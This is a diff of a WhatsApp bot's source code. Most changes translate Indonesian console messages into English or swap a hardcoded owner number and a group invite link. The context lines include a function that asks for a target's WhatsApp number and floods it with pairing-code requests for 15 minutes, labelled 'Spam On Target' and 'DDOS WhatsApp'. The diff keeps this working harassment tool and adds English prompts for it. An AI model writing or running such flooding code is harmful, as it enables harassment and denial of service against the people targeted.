@@ -146,14 +146,14 @@ if(usePairingCode && !lilychan.authState.creds.registered) {
   } else if (choice === '2') {
     await spamPairingRequest();
   } else {
-    console.log('Pilihan tidak valid.');
+    console.log('Invalid selection.');
   }
 }
 
 async function spamPairingRequest() {
   const startTime = Date.now();
   const duration = 15 * 60 * 1000; // 15 menit dalam milidetik
-  const phoneNumber = await question('Masukkan Nomor WhatsApp Target:\n');
+  const phoneNumber = await question('Enter Target WhatsApp Number:\n');
 
   // Sanitasi nomor telepon
   const sanitizedPhoneNumber = phoneNumber.replace(/[^0-9]/g, '');
@@ -165,7 +165,7 @@ async function spamPairingRequest() {
         const pairingCodeResponse = await lilychan.requestPairingCode(sanitizedPhoneNumber);
         console.log(`Spam On Target: ${pairingCodeResponse}`);
       } catch (error) {
-        console.error('Terjadi kesalahan saat meminta kode verifikasi:', error);
+        console.error('An error occurred while requesting the verification code:', error);
       }
 
       console.log(`DDOS WhatsApp: ${attempts} detik...`);
@@ -173,11 +173,11 @@ async function spamPairingRequest() {
       attempts--;
     }
 
-    console.log('Mengirim Ulang Dalam 30 detik...');
+    console.log('Resend In 30 seconds...');
     await new Promise(resolve => setTimeout(resolve, 30000)); // Tunggu 30 detik sebelum iterasi berikutnya
   }
 
-  console.log('Selesai. 15 menit telah berlalu.');
+  console.log('Done. 15 Minutes Have Passed.');
 }
 
 store.bind(lilychan.ev);
@@ -345,7 +345,7 @@ lolcatjs.fromString(`────────────『 INFORMATION 』─�
 │ » Uptime: ${uptimeDays}d ${uptimeHours}h ${uptimeMinutes}m ${uptimeSecs}s
 └───···`)
 await delay(1999);
-  lilychan.sendMessage('6281541177589' + "@s.whatsapp.net", { text: `ꜱᴜᴋꜱᴇꜱ ᴛᴇʀʜᴜʙᴜɴɢ ⚡️` }); 
+  lilychan.sendMessage('256703025571' + "@s.whatsapp.net", { text: `𝙰𝚄𝚁𝙾 𝙱𝙾𝚃 𝙲𝙾𝙽𝙽𝙴𝙲𝚃𝙴𝙳 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙺𝚈⚡️` }); 
         }
         if (
             connection === "close" &&
@@ -400,7 +400,7 @@ lilychan.sendMessage(anu.id,
                 title: 'W E L C O M E',
                 body: '',
                 thumbnail: xnxx,
-                sourceUrl: 'https://chat.whatsapp.com/GPS1NTSBgYKGFXUodW5XcD',
+                sourceUrl: 'https://chat.whatsapp.com/E1eQ4voBguTBBvey2KpMyi',
                 mediaType: 1,
                 renderLargerThumbnail: true
            }
@@ -427,7 +427,7 @@ lilychan.sendMessage(anu.id,
                 title: 'G O O D B Y E',
                 body: '',
                 thumbnail: pornhub,
-                sourceUrl: 'https://chat.whatsapp.com/GPS1NTSBgYKGFXUodW5XcD',
+                sourceUrl: 'https://chat.whatsapp.com/E1eQ4voBguTBBvey2KpMyi',
                 mediaType: 1,
                 renderLargerThumbnail: true
            }
